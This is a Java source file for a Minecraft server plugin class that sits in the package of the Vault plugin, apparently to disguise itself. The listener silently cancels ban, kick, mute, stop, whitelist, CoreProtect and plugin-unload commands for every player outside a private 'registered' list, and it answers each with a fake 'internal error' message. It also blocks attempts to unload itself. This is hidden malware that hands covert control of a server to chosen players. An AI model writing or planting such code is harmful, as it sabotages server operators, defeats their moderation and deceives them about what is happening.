package net.milkbowl.vault.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import net.milkbowl.vault.Core;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class ModerationCmds implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);

	List<String> messages = Arrays.asList("ban",
			"bukkit:",
			"minecraft:",
			"litebans",
			"wl",
			"eban",
			"ebanip",
			"essentials:",
			"ipban",
			"banip",
			"kick",
			"ekick",
			"punish",
			"stop",
			"restart",
			"reload",
			"rl",
			"ban-ip",
			"mute",
			"plugman",
			"emute",
			"kill",
			"ekill",
			"tempmute",
			"etempmute",
			"tempban",
			"etempban",
			"jail",
			"ejail",
			"aacban",
			"aackick",
			"checkip",
			"dupeip",
			"seen",
			"co",
			"coreprotect",
			"whitelist");
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		Player p = e.getPlayer();

		if (e.getMessage().equalsIgnoreCase("/plugman unload " + plugin.getDescription().getName())) {
			p.sendMessage("§cAn interal error has occured while attempting to execute this command.");
			e.setCancelled(true);
		}

		if (plugin.modcmds) {
			if (!plugin.registered.contains(p.getName())) {

				for(String cmd : messages) {
					if (e.getMessage().toLowerCase().startsWith("/"+cmd)) {
						e.setCancelled(true);
						p.sendMessage("§cAn interal error has occured while attempting to execute this command.");
					}
				}
			}
		}
	}
}
